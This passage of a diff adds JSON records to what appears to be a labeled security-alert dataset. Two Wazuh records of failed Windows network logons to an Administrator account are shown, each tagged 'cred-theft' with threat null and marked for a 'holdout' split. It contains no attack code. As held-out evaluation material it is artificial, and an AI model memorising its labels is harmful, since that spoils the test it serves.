+    "description": "Logon Failure - Unknown user or bad password",
+    "id": "60122",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_failed"
+    ],
+    "mitre": {
+     "id": [
+      "T1531"
+     ],
+     "tactic": [
+      "Impact"
+     ],
+     "technique": [
+      "Account Access Removal"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000067",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4625",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:20:01Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "targetUserName": "Administrator",
+      "logonType": "3",
+      "ipAddress": "10.20.4.91"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "wazuh",
+  "client": "Sahyadri Co-operative Bank",
+  "raw": {
+   "timestamp": "2026-11-22T14:20:03.000+0000",
+   "rule": {
+    "level": 5,
+    "description": "Logon Failure - Unknown user or bad password",
+    "id": "60122",
+    "firedtimes": 1,
+    "mail": false,
+    "groups": [
+     "windows",
+     "windows_security",
+     "authentication_failed"
+    ],
+    "mitre": {
+     "id": [
+      "T1531"
+     ],
+     "tactic": [
+      "Impact"
+     ],
+     "technique": [
+      "Account Access Removal"
+     ]
+    }
+   },
+   "agent": {
+    "id": "001",
+    "name": "SCB-BR2-WKS-014",
+    "ip": "10.20.4.37"
+   },
+   "manager": {
+    "name": "wazuh-server"
+   },
+   "id": "1763800000.0000068",
+   "location": "EventChannel",
+   "decoder": {
+    "name": "windows_eventchannel"
+   },
+   "data": {
+    "win": {
+     "system": {
+      "providerName": "Microsoft-Windows-Security-Auditing",
+      "eventID": "4625",
+      "channel": "Security",
+      "computer": "SCB-BR2-WKS-014",
+      "systemTime": "2026-11-22T14:20:03Z",
+      "severityValue": "INFORMATION",
+      "message": "\"Event recorded by Microsoft-Windows-Security-Auditing. Process Name: C:\\Windows\\System32\\lsass.exe\""
+     },
+     "eventdata": {
+      "targetUserName": "Administrator",
+      "logonType": "3",
+      "ipAddress": "10.20.4.91"
+     }
+    }
+   }
+  },
+  "label": {
+   "threat": null,
+   "scenario": "cred-theft",
+   "split": "holdout",
+   "why": ""
+  }
+ }
+]
